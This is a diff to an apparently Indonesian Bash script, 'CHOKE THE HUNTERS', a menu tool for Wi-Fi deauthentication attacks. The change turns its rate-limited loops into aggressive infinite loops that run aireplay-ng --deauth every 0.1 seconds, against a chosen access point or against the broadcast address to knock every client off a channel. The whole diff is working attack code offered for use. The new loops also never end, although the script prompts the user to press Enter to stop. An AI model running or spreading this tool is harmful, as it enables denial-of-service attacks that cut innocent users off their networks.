@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # ============================================
-#   MODULE: CHOKE THE HUNTERS (v9.0 Safe Loop)
+#   MODULE: CHOKE THE HUNTERS (v10.0 Ultimate)
 # ============================================
 
 if [ -f "./bxp_libcore.sh" ]; then source ./bxp_libcore.sh; fi
@@ -51,14 +51,6 @@ cleanup() {
 }
 trap cleanup SIGINT SIGTERM
 
-# FUNGSI LOOPING YANG LEBIH AMAN (Jeda 1 Detik)
-loop_deauth() {
-    while true; do 
-        aireplay-ng --deauth 10 -a "$1" "$2" > /dev/null 2>&1
-        sleep 1 # Jeda 1 detik biar driver gak crash
-    done
-}
-
 while true; do
     show_ascii; detect_env
     echo -e "${C}======================================================${N}"
@@ -68,7 +60,7 @@ while true; do
     echo ""
     if [ "$ROOT_MODE" -eq 1 ] && [ "$IS_TERMUX" -eq 0 ]; then
         echo -e "  \033[1;32m[1]\033[0m  \033[1;37mTargeted Deauth (1 BSSID)\033[0m"
-        echo -e "  \033[1;32m[2]\033[0m  \033[1;37mSafe Mass Deauth (Semua Client)\033[0m"
+        echo -e "  \033[1;32m[2]\033[0m  \033[1;37mUltimate Mass Deauth (Semua Client)\033[0m"
     else
         echo -e "  \033[1;30m[1] Targeted Deauth (Requires PC & Root)\033[0m"
         echo -e "  \033[1;30m[2] Mass Deauth (Requires PC & Root)\033[0m"
@@ -101,12 +93,14 @@ while true; do
             iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
             
             echo -e "\n${R}[*] INFINITE TARGETED DEAUTH KE $BSSID...${N}"
-            # Panggil fungsi loop_deauth dengan BSSID target
-            loop_deauth "$BSSID" "$MON_IFACE" &
-            LOOP_PID=$!
+            echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
             
-            echo -e "\n\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"; read -r
-            kill -9 $LOOP_PID 2>/dev/null; pkill -9 -f "aireplay-ng" 2>/dev/null
+            # Nampilin log langsung, jeda 0.1 detik
+            while true; do 
+                aireplay-ng --deauth 10 -a "$BSSID" "$MON_IFACE" | grep -E "Sending DeAuth|Invalid"
+                sleep 0.1
+            done
+            read -r
             cleanup; read -p "Press Enter to continue..."
             ;;
         2)
@@ -116,18 +110,15 @@ while true; do
             setup_monitor
             iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
             
-            echo -e "\n${R}[*] SAFE MASS DEAUTH DI CHANNEL $CHAN...${N}"
-            echo -e "${Y}[*] Mode ini nembak 1 BSSID broadcast secara berkala biar driver aman.${N}"
+            echo -e "\n${R}[*] ULTIMATE MASS DEAUTH DI CHANNEL $CHAN...${N}"
+            echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
             
-            # Looping Mass Deauth yang lebih aman (jeda 1 detik)
+            # Nampilin log langsung, jeda 0.1 detik
             while true; do 
-                aireplay-ng --deauth 10 -a "FF:FF:FF:FF:FF:FF" "$MON_IFACE" > /dev/null 2>&1
-                sleep 1
-            done &
-            LOOP_PID=$!
-            
-            echo -e "\n\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"; read -r
-            kill -9 $LOOP_PID 2>/dev/null; pkill -9 -f "aireplay-ng" 2>/dev/null
+                aireplay-ng --deauth 10 -a "FF:FF:FF:FF:FF:FF" "$MON_IFACE" | grep -E "Sending DeAuth|Invalid"
+                sleep 0.1
+            done
+            read -r
             cleanup; read -p "Press Enter to continue..."
             ;;
         0) exit 0 ;;
